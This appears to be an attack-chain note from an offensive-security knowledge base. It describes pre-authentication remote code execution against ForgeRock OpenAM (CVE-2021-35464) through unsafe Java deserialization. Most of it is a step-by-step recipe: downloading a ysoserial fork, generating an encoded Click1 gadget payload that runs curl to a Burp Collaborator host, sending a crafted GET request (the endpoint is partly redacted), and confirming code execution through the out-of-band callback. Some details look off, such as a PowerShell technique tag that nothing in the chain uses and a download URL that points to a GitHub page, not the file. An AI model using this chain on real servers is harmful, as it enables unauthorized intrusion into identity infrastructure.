---
tags:
  - rce
  - java-deserialization
  - forgerock-openam
  - jato-framework
  - pre-auth
type: attack_chain
tools:
  - '[[tools/ysoserial]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/wget-ysoserial-download]]'
  - '[[commands/java-ysoserial-generate-payload]]'
  - '[[commands/http-get-openam-exploit]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Download-Ysoserial-Tool]]'
  - '[[procedures/Generate-Deserialization-Payload]]'
  - '[[procedures/Send-HTTP-Request-to-Trigger-RCE]]'
  - '[[procedures/Verify-RCE-with-Out-of-Band-Interaction]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
  - '[[PowerShell]]'
updated_at: '2025-12-14T17:31:18.986Z'
description: >-
  Multi-stage attack exploiting unsafe Java deserialization in the Jato
  framework of ForgeRock OpenAM to achieve unauthenticated remote code execution
  through a crafted HTTP request.
skill_level: intermediate
impact_level: high
id: 4450db8f-59e5-4ac6-b1e5-8e23f3c5fd14
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
  - '[[PowerShell]]'
---
# Pre-Authentication RCE via Unsafe Java Deserialization in ForgeRock OpenAM

Multi-stage attack chain demonstrating unauthenticated remote code execution in ForgeRock OpenAM by exploiting unsafe Java deserialization in the Jato framework. The attack involves generating a malicious payload with ysoserial, injecting it into an HTTP request to a vulnerable endpoint, and confirming execution via out-of-band interaction.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Download Tool] --> B[Generate Payload]
    B --> C[Send Request]
    C --> D[Verify Interaction]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ysoserial]]
- [[tools/Burp-Collaborator]]

### Target Environment

- ForgeRock OpenAM server running vulnerable version (affected by CVE-2021-35464)
- Required services/ports: HTTPS on port 443
- Network access requirements: Direct internet access to the target server

### Initial Access Requirements

- No credentials required (pre-authentication)
- Network position: External attacker with HTTP access to the OpenAM endpoint
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Download Ysoserial Tool
procedure: [[procedures/Download-Ysoserial-Tool]]

**Objective**: Obtain the ysoserial tool for generating Java deserialization payloads.

**Instructions**: Use [[commands/wget-ysoserial-download]] to fetch the JAR file from the GitHub repository:

```bash
wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar
```

**Expected Output**: The ysoserial-0.0.6-SNAPSHOT-all.jar file is downloaded to the current directory.

**Success Indicators**:
- JAR file present and verifiable (e.g., via `ls` or `file` command)
- No download errors

### Step 2: Generate Deserialization Payload
procedure: [[procedures/Generate-Deserialization-Payload]]

**Objective**: Create a base64-encoded deserialization payload using the Click1 gadget chain to execute a curl command for out-of-band detection.

**Instructions**: Run [[commands/java-ysoserial-generate-payload]] with a unique Burp Collaborator subdomain (replace the example ID):

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Click1 "curl https://your-unique-id.burpcollaborator.net" | (echo -ne \x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt
```

**Expected Output**: A URL-safe base64-encoded payload string saved to payload.txt, without newlines or padding.

**Success Indicators**:
- payload.txt contains a long base64 string
- No Java execution errors

### Step 3: Send HTTP Request to Trigger RCE
procedure: [[procedures/Send-HTTP-Request-to-Trigger-RCE]]

**Objective**: Inject the payload into the vulnerable OpenAM endpoint to trigger deserialization and execute the command.

**Instructions**: Craft and send an HTTP GET request using [[commands/http-get-openam-exploit]], replacing XYZ with the contents of payload.txt and the redacted path with the actual endpoint (e.g., /openam/json/authenticate?Realm=/&username=... but specific to CVE-2021-35464 endpoint):

```bash
GET /openam/██████████=payload-from-payload.txt HTTP/1.1
Host: target-openam-server:443
```

Use tools like curl or Burp Suite to send this request to the target server.

**Expected Output**: HTTP 302 redirect to /openam/base/AMInvalidURL with Location header pointing to the invalid URL.

**Success Indicators**:
- Server returns 302 status
- No authentication prompt (pre-auth)

### Step 4: Verify RCE with Out-of-Band Interaction
procedure: [[procedures/Verify-RCE-with-Out-of-Band-Interaction]]

**Objective**: Confirm remote code execution by observing the callback from the target server to Burp Collaborator.

**Instructions**: Monitor the Burp Collaborator instance for incoming requests from the target server executing the curl command.

**Expected Output**: Burp Collaborator logs show an HTTP or DNS request from the target's IP to the collaborator subdomain.

**Success Indicators**:
- Incoming callback detected in Burp Collaborator
- Request matches the payload command (e.g., curl User-Agent or headers)

## Attack Chain Summary

### Key Achievements

1. Downloaded ysoserial for payload generation
2. Created and encoded a deserialization gadget chain using Click1
3. Triggered unauthenticated RCE on ForgeRock OpenAM
4. Confirmed execution via out-of-band interaction

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]
- [[PowerShell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
